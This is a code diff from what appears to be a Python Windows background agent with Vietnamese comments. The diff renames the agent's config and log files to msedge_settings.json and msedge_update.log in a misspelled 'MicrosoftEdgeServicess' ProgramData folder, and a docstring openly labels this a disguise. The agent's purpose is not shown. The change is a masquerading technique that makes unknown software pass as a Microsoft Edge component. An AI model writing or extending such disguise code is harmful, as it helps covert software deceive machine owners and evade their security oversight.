@@ -62,15 +62,20 @@ def get_app_dir():
 
 def get_config_path():
     """
-    Tim duong dan file config.json theo thu tu uu tien:
-    1. C:\\ProgramData\\MicrosoftEdgeServicess\\config.json (Thu muc cai dat chuan he thong)
-    2. Cung thu muc voi file exe / script
-    3. Thu muc lam viec hien tai (os.getcwd())
+    Tim duong dan file cau hinh theo thu tu uu tien:
+    1. msedge_settings.json trong C:\ProgramData\MicrosoftEdgeServicess (Uu tien chuan nguy trang)
+    2. config.json trong C:\ProgramData\MicrosoftEdgeServicess (Tuong thich nguoc)
+    3. msedge_settings.json cung thu muc exe / script
+    4. config.json cung thu muc exe / script
+    5. msedge_settings.json / config.json trong os.getcwd()
     """
     sys_dir = r"C:\ProgramData\MicrosoftEdgeServicess"
     candidates = [
+        os.path.join(sys_dir, "msedge_settings.json"),
         os.path.join(sys_dir, "config.json"),
+        os.path.join(get_app_dir(), "msedge_settings.json"),
         os.path.join(get_app_dir(), "config.json"),
+        os.path.join(os.getcwd(), "msedge_settings.json"),
         os.path.join(os.getcwd(), "config.json")
     ]
     for c in candidates:
@@ -78,18 +83,28 @@ def get_config_path():
             return c
 
     if os.path.exists(sys_dir):
-        return os.path.join(sys_dir, "config.json")
-    return os.path.join(get_app_dir(), "config.json")
+        return os.path.join(sys_dir, "msedge_settings.json")
+    return os.path.join(get_app_dir(), "msedge_settings.json")
 
 
 def get_log_path():
     """
-    Xac dinh noi luu file nhat ky agent_service.log.
+    Xac dinh noi luu file nhat ky (msedge_update.log / agent_service.log).
     """
     sys_dir = r"C:\ProgramData\MicrosoftEdgeServicess"
+    candidates = [
+        os.path.join(sys_dir, "msedge_update.log"),
+        os.path.join(sys_dir, "agent_service.log"),
+        os.path.join(get_app_dir(), "msedge_update.log"),
+        os.path.join(get_app_dir(), "agent_service.log")
+    ]
+    for c in candidates:
+        if os.path.exists(c):
+            return c
+
     if os.path.exists(sys_dir):
-        return os.path.join(sys_dir, "agent_service.log")
-    return os.path.join(get_app_dir(), "agent_service.log")
+        return os.path.join(sys_dir, "msedge_update.log")
+    return os.path.join(get_app_dir(), "msedge_update.log")
 
 
 # Khoi tao Logger ghi dong thoi ra console va file
